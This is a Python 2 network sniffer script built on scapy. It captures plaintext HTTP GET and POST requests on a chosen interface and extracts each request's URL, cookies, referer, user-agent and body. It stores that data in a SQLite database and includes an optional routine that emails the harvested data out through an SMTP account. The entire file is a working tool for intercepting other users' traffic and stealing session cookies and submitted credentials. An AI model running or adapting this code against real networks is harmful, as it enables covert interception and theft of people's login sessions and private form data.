#!/usr/bin/env python
# coding=utf-8
# code by 92ez.com

from email.mime.text import MIMEText
from scapy.all import *
import smtplib
import sqlite3
import os
import sys

def dealPackage(packet):

	lines = packet.sprintf("{Raw:%Raw.load%}").replace("'","").split(r"\r\n")

	# if you want to save all http requests !
	# print '-'*90
	# saveToDB(lines) 

	# if you want to save http requests only post or get data is null
	if len(lines[-1]) > 1 and len(lines) > 1:
		print '-'*90
		saveToDB(lines)
		# sendMail('***@qq.com','Notice ! Found Data!','<br>'.join(lines))

def saveToDB(data):

	this_url = ''
	this_cookies = ''
	this_data = ''
	this_referer = ''
	this_ua = ''
	this_type = ''

	try:
		cx = sqlite3.connect(sys.path[0]+"/httplog.db")
		cx.text_factory = str
		cu = cx.cursor()
		for line in data[0:-1]:
			if 'Host:' in line:
				this_url = line.split('Host:')[1]
			if 'Referer:' in line:
				this_referer = line.split('Referer:')[1]
			if 'User-Agent:' in line:
				this_ua = line.split('User-Agent:')[1]
			if 'Cookie:' in line:
				this_cookies = line.split('Cookie:')[1]

			print line

		this_type = data[0].split(' ')[0]
		this_url = this_url + data[0].split(' ')[1]
		this_data = data[-1]
		cu.execute("insert into record (url,reqType,cookies,referer,data,ua) values (?,?,?,?,?,?)", (this_url,this_type,this_cookies,this_referer,this_data,this_ua))
		cx.commit()
		print '[√] Insert successly!'
		cu.close()
		cx.close()
	except Exception, e:
		print e

def sendMail(receiver, title, body):
	host = 'smtp.126.com'
	port = 25
	sender = '***@126.com'
	pwd = '***'

	msg = MIMEText(body, 'html')
	msg['subject'] = title
	msg['from'] = sender
	msg['to'] = receiver

	try:
		s = smtplib.SMTP(host, port)
		s.login(sender, pwd)
		s.sendmail(sender, receiver, msg.as_string())
		print '[*] The mail named %s to %s is sent successly.' % (title, receiver)
	except Exception,e:
		sys.exit('[x] Send email failed! Exception is %s.' % e)

def doSniffer():
	sniff_iface = sys.argv[1]
	try:
		print '[√] Sniffing on '+sniff_iface+'!'
		sniff(iface = sniff_iface,prn = dealPackage,lfilter=lambda p: "GET" in str(p) or "POST" in str(p),filter="tcp")
	except Exception,e:
		sys.exit('[x] Can not do sniff on %s! Please check! Exception is %s' % (sniff_iface,e))

if __name__ == '__main__':
	doSniffer()
